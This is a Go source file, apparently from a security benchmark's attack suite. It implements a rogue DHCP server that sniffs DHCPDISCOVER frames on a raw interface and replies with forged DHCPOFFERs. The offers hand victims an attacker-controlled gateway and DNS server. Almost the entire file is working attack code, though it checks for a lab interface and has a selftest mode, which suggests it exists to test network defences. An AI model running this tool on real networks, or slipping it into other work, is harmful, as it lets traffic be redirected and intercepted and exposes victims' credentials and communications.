package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const etherTypeIPv4 = 0x0800

func ipToUint(ip net.IP) uint32 {
	return binary.BigEndian.Uint32(ip.To4())
}

func uintToIP(value uint32) net.IP {
	result := make(net.IP, net.IPv4len)
	binary.BigEndian.PutUint32(result, value)
	return result
}

func parseIPv4Flag(name, value string) (net.IP, error) {
	ip := net.ParseIP(value).To4()
	if ip == nil {
		return nil, fmt.Errorf("invalid %s IPv4 address %q", name, value)
	}
	return ip, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("Rogue DHCP server — answers DISCOVER with forged OFFERs")
	poolStart := fs.String("pool_start", "192.168.1.100", "")
	poolEnd := fs.String("pool_end", "192.168.1.150", "")
	gateway := fs.String("gateway", "192.168.1.66", "gateway handed out to victims")
	dns := fs.String("dns", "192.168.1.66", "DNS server handed out to victims")
	leaseTime := fs.Int("lease_time", 3600, "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	poolStartIP, err := parseIPv4Flag("pool_start", *poolStart)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	poolEndIP, err := parseIPv4Flag("pool_end", *poolEnd)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	gatewayIP, err := parseIPv4Flag("gateway", *gateway)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	dnsIP, err := parseIPv4Flag("dns", *dns)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	if *leaseTime < 0 {
		attackcommon.Status("FATAL", "--lease_time must not be negative")
		return 1
	}

	srcMAC := attackcommon.InterfaceMAC(common.Iface)
	if common.Selftest {
		var chaddr [6]byte
		copy(chaddr[:], []byte{0x02, 0x00, 0x00, 0xaa, 0xbb, 0xcc})
		frame := attackcommon.BuildDHCPOffer(1234, chaddr, poolStartIP, gatewayIP, dnsIP, uint32(*leaseTime), srcMAC)
		attackcommon.SelftestOK("dhcp_rogue", fmt.Sprintf("DHCPOFFER len=%d", len(frame)))
		return 0
	}

	lo := ipToUint(poolStartIP)
	hi := ipToUint(poolEndIP)
	cursor := lo
	nextIP := func() net.IP {
		value := cursor
		if cursor >= hi {
			cursor = lo
		} else {
			cursor++
		}
		return uintToIP(value)
	}

	_, err = attackcommon.RunLoop(common.Count, 0.1, func(n int) error {
		// Bind before receiving; offers are sent from this same loop as discovers arrive.
		receiver, err := attackcommon.OpenRawReceiver(common.Iface)
		if err != nil {
			return err
		}
		defer receiver.Close()
		sender, err := attackcommon.OpenRawSender(common.Iface)
		if err != nil {
			return err
		}
		defer sender.Close()

		attackcommon.Status("INFO", fmt.Sprintf("round #%d: listening for DHCPDISCOVER on %s (pool %s-%s)", n+1, common.Iface, *poolStart, *poolEnd))
		offered := 0
		waitSeconds := common.Interval
		if waitSeconds == 0 {
			waitSeconds = 5
		}
		deadline := time.Now().Add(time.Duration(waitSeconds * float64(time.Second)))
		if err := receiver.SetReadDeadline(deadline); err != nil {
			return err
		}
		for {
			frame, err := receiver.ReadFrame()
			if err != nil {
				// The receiver deadline is the normal end of one sniff round.
				break
			}
			_, _, ethertype, _, payload := attackcommon.ParseEthernet(frame)
			if ethertype != etherTypeIPv4 {
				continue
			}
			_, _, sport, dport, udpPayload, ok := attackcommon.ParseIPv4UDP(payload)
			if !ok || (sport != 67 && dport != 67) {
				continue
			}
			xid, chaddr, _, msgType, ok := attackcommon.ParseBOOTP(udpPayload)
			if !ok || msgType != 1 || len(udpPayload) < 44 {
				continue
			}

			// Scapy logs BOOTP.chaddr as the complete 16-byte field. Keep all ten
			// padding bytes in the log, while the shared builder takes the real MAC.
			chaddrText := hex.EncodeToString(udpPayload[28:44])
			offerIP := nextIP()
			offer := attackcommon.BuildDHCPOffer(xid, chaddr, offerIP, gatewayIP, dnsIP, uint32(*leaseTime), srcMAC)
			if err := sender.Send(offer); err != nil {
				return fmt.Errorf("send DHCPOFFER: %w", err)
			}
			offered++
			attackcommon.Status("SENT", fmt.Sprintf("OFFER %s -> chaddr=%s (gateway=%s dns=%s)", offerIP, chaddrText, *gateway, *dns))
		}
		attackcommon.Status("INFO", fmt.Sprintf("round #%d: %d offer(s) sent", n+1, offered))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
